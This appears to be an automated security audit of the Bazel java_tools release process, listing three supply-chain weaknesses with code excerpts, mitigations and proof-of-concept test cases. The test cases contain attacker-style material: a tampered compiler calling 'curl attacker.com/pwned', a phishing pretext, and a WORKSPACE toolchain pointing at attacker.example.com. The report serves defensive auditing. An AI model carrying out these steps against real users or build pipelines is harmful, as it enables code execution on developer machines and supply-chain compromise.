### Vulnerability List:

- Vulnerability Name: Unverified Download of Release Artifacts in `release.py`
- Description:
    - The `release.py` script downloads release artifacts using `wget` from URLs specified in a JSON file provided as a command-line argument `--artifacts`.
    - This JSON file is expected to be generated by an upstream release process.
    - If this upstream process is compromised, an attacker could modify the JSON file to inject malicious URLs for the `mirror_url` fields.
    - When a user executes `release.py` with this compromised JSON, the script will download artifacts from the attacker-controlled malicious URLs.
    - These downloaded malicious artifacts could replace legitimate `java_tools` components in the release process.
- Impact:
    - Arbitrary code execution on developer machines.
    - Malicious Java code embedded within the tools could be executed during a Bazel build.
    - Attackers could gain control over the developer's environment, leading to data theft, malware propagation, or disruption of development workflows.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. There are no implemented mitigations in the `release.py` script or the documented release process to verify the integrity or source of the download URLs.
    - Security relies entirely on the assumption that the upstream processes generating the artifacts JSON are always secure.
- Missing Mitigations:
    - **URL Verification:** Implement verification to ensure that the `mirror_url` belongs to a trusted domain (e.g., `mirror.bazel.build`) by checking the hostname against a whitelist.
    - **Integrity Check:** Implement integrity checks by comparing the SHA256 checksum of the downloaded file against the expected `sha` value provided in the artifacts JSON, immediately after download and before further processing.
    - **Secure Artifacts JSON Generation:** Harden the security of the upstream pipeline and scripts (`create_java_tools_release.sh`) to prevent malicious injection of URLs at the source, including access control, input validation, and integrity checks within the pipeline.
- Preconditions:
    - An attacker must compromise the upstream release process responsible for generating the artifacts JSON file.
    - A release manager or user with access to execute `release.py` must run the script with the compromised artifacts JSON file using the `--artifacts` argument.
- Source Code Analysis:
    ```python
    def download_file(mirror_url):
      wget.download(mirror_url , '.')
    ```
    - The `download_file` function in `release.py` uses `wget.download()` to download files based on `mirror_url` without any validation, sanitization, or integrity checking.
    - The `mirror_url` is directly taken from the `artifacts` JSON, parsed from the `--artifacts` command-line argument.

    ```python
    def main():
      parser = argparse.ArgumentParser()
      parser.add_argument(
          '--artifacts',
          required=True,
          dest='artifacts',
          help='Output from create_java_tools_release.sh')
      opts = parser.parse_args()

      artifacts = json.loads(opts.artifacts)["artifacts"]

      relnotes = "To use this java_tools release, add to your WORKSPACE file the definitions: \n```py"
      for platform in artifacts:
        relnotes += generate_release_info(platform, artifacts[platform])
        download_file(artifacts[platform]["mirror_url"])
    ```
    - The `main` function parses the `--artifacts` argument as JSON and iterates through the `artifacts` dictionary, extracting `mirror_url` and passing it to `download_file` without any safety checks.
    - This direct and unverified download process allows injection of harmful URLs and compromises downloaded artifacts.
- Security Test Case:
    1. **Setup Malicious Server:** Configure an HTTP server to host a malicious replacement `java_tools` zip file (e.g., `malicious_java_tools.zip`) with a harmless payload (e.g., a Java class that creates `/tmp/pwned_test`). Obtain the URL (e.g., `http://localhost:8000/malicious_java_tools.zip`).
    2. **Craft Malicious Artifacts JSON:** Create `malicious_artifacts.json` and replace the legitimate `mirror_url` for one platform (e.g., `java_tools_linux`) with the malicious URL (`http://localhost:8000/malicious_java_tools.zip`). Use a dummy `sha` value.
    ```json
    {
      "artifacts": {
        "java_tools_linux": {
          "mirror_url": "http://localhost:8000/malicious_java_tools.zip",
          "sha": "dummy_sha",
          "github_url": "https://dummy.github.com/url"
        },
        "java_tools_windows": {
          "mirror_url": "https://mirror.bazel.build/bazel_java_tools/releases/java/vXX.XX/java_tools_windows-vXX.XX.zip",
          "sha": "valid_sha_windows",
          "github_url": "https://github.com/bazelbuild/java_tools/releases/download/java_vXX.XX/java_tools_windows-vXX.XX.zip"
        },
        // ... other platforms ...
      }
    }
    ```
    3. **Execute `release.py` with Malicious JSON:** Run `python /code/scripts/release.py --artifacts "$(cat malicious_artifacts.json)"`.
    4. **Verify Malicious Download:** Check the current directory for `malicious_java_tools.zip`, downloaded from the malicious server.
    5. **Verify Payload Execution (If Applicable):** If the malicious zip contained a payload, attempt to trigger it and verify execution (e.g., check for `/tmp/pwned_test`).
    6. **Cleanup:** Delete downloaded files and stop the malicious HTTP server.

- Vulnerability Name: Social Engineering for Malicious `java_tools` Release
- Description:
    - An attacker creates a malicious `java_tools` release by modifying official artifacts or creating new, compromised tools.
    - The attacker hosts the malicious release on a public server.
    - The attacker socially engineers a Bazel user into using an `http_archive` definition in their `WORKSPACE` file, pointing to the malicious release.
    - The Bazel user adds this definition, unaware of the malicious URL.
    - When the user builds a Java project, Bazel downloads and uses the compromised `java_tools`.
    - Malicious tools are executed during the Java build process.
- Impact:
    - Arbitrary code execution on the Bazel user's machine or build environment.
    - Compromise of built software artifacts and potential supply chain attacks.
    - Data exfiltration and denial of service.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None explicitly implemented in `java_tools` to prevent social engineering.
    - Documentation implicitly relies on user awareness to use trusted releases from the official repository (`https://github.com/bazelbuild/java_tools/releases`).
- Missing Mitigations:
    - **Stronger documentation emphasis:** Prominently warn users about risks of untrusted `java_tools` releases, guide them to use official releases, and detail integrity verification (e.g., SHA256 checksums).
    - **Code signing of release artifacts:** Digitally sign release artifacts to allow users to cryptographically verify authenticity and integrity before use.
    - **Supply chain security hardening:** Implement robust measures for the release process (Buildkite pipelines, GCP storage, GitHub release process) to prevent unauthorized modifications.
- Preconditions:
    - An attacker must create and host a malicious `java_tools` release.
    - The attacker must socially engineer a Bazel user to use the malicious release URL in their `WORKSPACE` file.
- Source Code Analysis:
    - No specific code in provided files directly introduces this vulnerability.
    - The vulnerability arises from Bazel's `http_archive` mechanism, which allows downloading dependencies from arbitrary URLs, vulnerable to social engineering.
    - `/code/README.md` provides instructions for using `http_archive` to specify `java_tools` releases, highlighting the attack vector if misused with malicious URLs.
    - Release process documentation (`/code/docs/release-automated.md`, `/code/docs/release.md`, `/code/docs/behind-the-release.md`) focuses on official releases but lacks security measures against social engineering.
    - `/code/scripts/release.py` is a utility script not related to this vulnerability.
- Security Test Case:
    1. **Setup Malicious Release:** Create a modified `java_tools` release (e.g., modify `java_compiler.jar` to execute `curl attacker.com/pwned`). Calculate the SHA256 hash.
    2. **Host Malicious Release:** Host the modified release at `http://attacker.example.com/malicious_java_tools.zip`.
    3. **Craft Social Engineering Attack:** Send an email to a Bazel user claiming a critical bug fix in a "new" release at `http://attacker.example.com/malicious_java_tools.zip`, providing the SHA256 hash.
    4. **Victim Configuration:** The Bazel user modifies their `WORKSPACE` file with the provided `http_archive` definition, using the malicious URL and SHA256.
    ```python
    http_archive(
        name = "remote_java_tools_malicious",
        urls = ["http://attacker.example.com/malicious_java_tools.zip"],
        sha256 = "<SHA256 hash of malicious_java_tools.zip provided by attacker>"
    )

    java_toolchain(
        name = "malicious_java_toolchain",
        java_runtime = "@remote_java_runtime//:jdk",
        javac = "@remote_java_tools_malicious//:java_compiler",
        ...
    )

    toolchain(
        name = "java_toolchain_alias",
        toolchain = ":malicious_java_toolchain",
        toolchain_type = "@bazel_tools//tools/jdk:toolchain_type",
    )
    ```
    5. **Trigger Build:** The user runs `bazel build //path/to/java/target`.
    6. **Malicious Code Execution:** Bazel downloads the malicious release and uses the compromised `java_compiler`, executing the malicious code (e.g., request to `attacker.com/pwned`).

- Vulnerability Name: Insufficient Integrity Verification of Release Artifacts
- Description:
    - An attacker compromises release infrastructure or gains access to publishing credentials.
    - The attacker replaces legitimate `java_tools` release artifacts on releases page and mirror with malicious versions.
    - The attacker updates `sha256` checksums in release notes and potentially `rules_java` to match malicious artifacts.
    - Users follow instructions in `README.md` or release notes, copying `http_archive` definitions without independently verifying checksums.
    - Bazel downloads malicious `java_tools` artifacts during project setup.
    - Malicious `java_tools` are used during builds, potentially leading to code execution or other malicious activities.
- Impact:
    - Supply chain compromise.
    - Users' Bazel builds use malicious tools.
    - Arbitrary code execution in the build environment.
    - Malicious modification of build outputs.
    - Data exfiltration.
    - Compromise of developer machines.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - Checksums (SHA256) are provided in:
        - Release notes on GitHub releases page.
        - `java_tools_repos()` function in `rules_java/java/repositories.bzl`.
    - Release process relies on Buildkite pipelines and GCP for building and hosting, providing some infrastructure security (specific measures not detailed).
- Missing Mitigations:
    - **Explicit User Guidance on Independent Verification:** Documentation lacks strong emphasis on users independently verifying checksums. Add clear warnings to `README.md`, release notes, and user-facing documentation, instructing users to verify checksums using trusted tools and sources separate from release notes.
    - **Automated Checksum Verification Tools:** Provide scripts or tools to automate artifact checksum verification against trusted, independent sources (e.g., Bazel plugin or standalone script).
    - **Artifact Signing:** Digitally sign release artifacts for stronger integrity and authenticity verification. Users can verify signatures using a trusted public key.
- Preconditions:
    - Attacker must compromise release infrastructure or gain publishing credentials to replace artifacts and update checksums.
    - Users must rely solely on provided checksums without independent verification.
- Source Code Analysis:
    - **`README.md`, `docs/release.md`, `docs/release-automated.md`**: Documentation describes release process and instructs users to integrate `java_tools` using `http_archive` with provided URLs and SHA256 checksums.
    - Example in `README.md` shows `http_archive` definitions.
    - Documentation guides users to copy definitions including checksums but lacks warnings about independent verification.
    - **`scripts/release.py`**: Used by release managers, not related to user-side verification.
    - **Absence of User-Side Verification Mechanisms**: Project lacks tooling for users to independently verify artifact integrity, relying solely on manually copying and trusting provided checksums.
- Security Test Case:
    1. **Attacker Simulation (Artifact Manipulation):**
        - Choose a `java_tools` release (e.g., v13.1).
        - Download official `java_tools_linux-v13.1.zip`.
        - Create a malicious version of `java_tools_linux-v13.1.zip` (e.g., print warning to `stderr`).
        - Calculate SHA256 checksum of the malicious zip.
        - Simulate compromise: locally replace legitimate zip with malicious zip in a local directory as fake mirror. Prepare fake release notes snippet with updated checksum.
    2. **Victim Project Setup:**
        - Create a new Bazel project with Java target.
        - In `WORKSPACE`, define `http_archive` for `remote_java_tools_linux`.
            - Modify `urls` to point to local directory with *malicious* `java_tools_linux-v13.1.zip`.
            - Use the *updated* SHA256 checksum for the malicious zip.
            - Do *not* implement independent checksum verification.
    3. **Build Execution:** Run `bazel build //...`.
    4. **Vulnerability Verification:** Observe Bazel output. If malicious code executes (e.g., warning message), it confirms user's build uses malicious tools due to trusting compromised checksums.
